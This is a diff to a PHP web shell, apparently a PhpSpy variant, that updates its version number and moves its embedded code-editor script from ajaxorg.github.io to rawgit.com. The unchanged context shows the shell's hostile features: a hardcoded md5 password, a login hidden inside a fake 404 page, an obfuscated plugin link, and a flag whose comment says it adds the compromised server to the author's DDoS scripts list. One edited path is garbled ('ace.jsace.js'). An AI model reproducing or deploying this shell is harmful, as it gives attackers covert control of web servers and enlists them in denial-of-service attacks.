@@ -1,6 +1,6 @@
 <?php
 $pass               = md5("pw");
-$version            = 3.71;
+$version            = 3.8;
 $adaptiveerrorpage  = true; //Get Default 404 page and replicate it, but add a login text field in the center at the bottom
 $checkforupdates    = true;
 $helpsupportbooter  = true; //True adds the shell to my ddos scripts list, I can't log in providing you change the password above
@@ -857,7 +857,7 @@ function shutDownFunction($phpcode, $action, $charsetpage, $charsetpagedb) {
             'value' => htmlspecialchars($phpcode)
         ));
         p('<p><a href="http://w' . 'ww.4ng' . 'el.net/php' . 'spy/pl' . 'ugin/" target="_blank">Get plugins</a></p>');
-        p('<script src="//ajaxorg.github.io/ace-builds/src-noconflict/ace.js"></script>');
+        p('<script src="//rawgit.com/ajaxorg/ace-builds/master/src-noconflict/ace.jsace.js"></script>');
         printaceext();
         if (!$mobile) p('<script>var l=document.getElementsByTagName("textarea");for(i=0;i<l.length;++i){if(l[i].hasAttribute("data-editor")){var e=l[i];var t=e.getAttribute("data-editor");var n=document.createElement("div");n.style.cssText="width:"+e.clientWidth+"px;height:"+e.clientHeight+"px;";n.className=e.className;e.parentNode.insertBefore(n,e);e.style.cssText="display:none;";var r=ace.edit(n);r.renderer.setShowGutter(true);r.getSession().setValue(e.value);var i=ace.require("ace/ext/modelist");var s=i.getModeForPath("example.php").mode;r.getSession().setMode(s);r.setTheme("ace/theme/dreamweaver");e.form.onsubmit=function(t){window.onbeforeunload = null;e.value=r.getSession().getValue()}}}</script>');
         formfooter();
@@ -2682,7 +2682,7 @@ maketext(array(
         'value' => $encode
     ));
       formfooter();
-    p('<script src="//ajaxorg.github.io/ace-builds/src-noconflict/ace.js"></script>');
+    p('<script src="//rawgit.com/ajaxorg/ace-builds/master/src-noconflict/ace.js"></script>');
     printaceext();
     if (!$mobile) p('<script>var l=document.getElementsByTagName("textarea");for(i=0;i<l.length;++i){if(l[i].hasAttribute("data-editor")){var e=l[i];var t=e.getAttribute("data-editor");var n=document.createElement("div");n.style.cssText="width:"+e.clientWidth+"px;height:"+e.clientHeight+"px;";n.className=e.className;e.parentNode.insertBefore(n,e);e.style.cssText="display:none;";var r=ace.edit(n);r.renderer.setShowGutter(true);r.getSession().setValue(e.value);var i=ace.require("ace/ext/modelist");var s=i.getModeForPath("example.php").mode;r.getSession().setMode(s);r.setTheme("ace/theme/dreamweaver");e.form.onsubmit=function(t){window.onbeforeunload = null;e.value=r.getSession().getValue()}}}</script>');
     
@@ -2741,7 +2741,7 @@ maketext(array(
         'value' => htmlspecialchars($phpcode)
     ));
     p('<p><a href="http://w' . 'ww.4ng' . 'el.net/php' . 'spy/pl' . 'ugin/" target="_blank">Get plugins</a></p>');
-    p('<script src="//ajaxorg.github.io/ace-builds/src-noconflict/ace.js"></script>');
+    p('<script src="//rawgit.com/ajaxorg/ace-builds/master/src-noconflict/ace.js"></script>');
     printaceext();
     if (!$mobile) p('<script>var l=document.getElementsByTagName("textarea");for(i=0;i<l.length;++i){if(l[i].hasAttribute("data-editor")){var e=l[i];var t=e.getAttribute("data-editor");var n=document.createElement("div");n.style.cssText="width:"+e.clientWidth+"px;height:"+e.clientHeight+"px;";n.className=e.className;e.parentNode.insertBefore(n,e);e.style.cssText="display:none;";var r=ace.edit(n);r.renderer.setShowGutter(true);r.getSession().setValue(e.value);var i=ace.require("ace/ext/modelist");var s=i.getModeForPath("example.php").mode;r.getSession().setMode(s);r.setTheme("ace/theme/dreamweaver");e.form.onsubmit=function(t){window.onbeforeunload = null;e.value=r.getSession().getValue()}}}</script>');
     
@@ -2771,7 +2771,7 @@ maketext(array(
         'value' => $contents
     ));
     
-    p('<script src="//ajaxorg.github.io/ace-builds/src-noconflict/ace.js"></script>');
+    p('<script src="//rawgit.com/ajaxorg/ace-builds/master/src-noconflict/ace.js"></script>');
     printaceext();
     if (!$mobile) p('<script>var l=document.getElementsByTagName("textarea");for(i=0;i<l.length;++i){if(l[i].hasAttribute("data-editor")){var e=l[i];var t=e.getAttribute("data-editor");var n=document.createElement("div");n.style.cssText="width:"+e.clientWidth+"px;height:"+e.clientHeight+"px;";n.className=e.className;e.parentNode.insertBefore(n,e);e.style.cssText="display:none;";var r=ace.edit(n);r.renderer.setShowGutter(true);r.getSession().setValue(e.value);var i=ace.require("ace/ext/modelist");var s=i.getModeForPath("' . $opfile . '").mode;r.getSession().setMode(s);r.setTheme("ace/theme/dreamweaver");e.form.onsubmit=function(t){window.onbeforeunload = null;e.value=r.getSession().getValue()}}}</script>');
     formfooter();
